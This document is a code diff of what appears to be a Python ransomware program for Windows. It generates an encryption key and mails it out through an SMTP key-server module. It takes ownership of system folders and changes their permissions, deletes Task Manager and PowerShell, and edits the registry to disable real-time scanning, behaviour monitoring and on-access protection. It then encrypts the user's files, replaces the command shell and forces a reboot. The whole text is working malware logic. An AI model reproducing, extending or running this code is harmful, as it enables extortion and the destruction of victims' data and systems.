@@ -6,17 +6,10 @@ import tkinter as tk
 from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
-from modules.system import killproc, delproc, regedit
+from modules.system import killproc, delproc, regedit, cpysrc, service
 from modules.network import host_connect, sendkey_smtp, keyserver
 import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
-
-x = os.path.isdir("\\PerfLogs\\gui_counter")
-def copy_counter():
-        cpath = os.getcwd()
-        src = "%s\setup\gui_counter" %(cpath)
-        dst = "\\PerfLogs\\gui_counter"
-        cpy = shutil.copytree(src, dst)
-
+# ENVIRONMENT VARIABLE
 usr = os.environ["USERNAME"]
 if(get_admin_rights.is_admin()):
     if host_connect.keyrcv():
@@ -25,25 +18,36 @@ if(get_admin_rights.is_admin()):
         crypt.genkey(usr)
         sendkey_smtp.send_key()
         takeown.process()
-        takeown.perf()
         takeown.exp()
+        takeown.perf()
+        takeown.perfall()
+        takeown.sysDir()
         icacls.perf()
-        if(x):
-            pass
-        else:
-            copy_counter()
         icacls.perfall()
-        regedit.setRef()
+        icacls.sysDir()
+        cpysrc.cp_guitmp()
+        regedit.delInit()
+        regedit.setInit()
+        regedit.noRun()
+        regedit.spy()
+        regedit.scanRtime()
+        regedit.bMonitor()
+        regedit.onAccess()
         icacls.exp()
         icacls.pshll()
         icacls.sys32()
         delproc.tskmgr()
         killproc.smart()
         delproc.smart()
+        delproc.pwsst()
         crypt.filelist()
+        cpysrc.cp_cmd()
+        cpysrc.cp_gui()
+        regedit.delcmd()
+        regedit.setCmd()
         killproc.exp()
+        delproc.exp()
 else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
-# Run the GUI Counter
-gcount = "\\PerfLogs\\gui_counter\\gui_counter.exe"
-os.system(gcount)
+# REBOOT WINDOWS
+os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
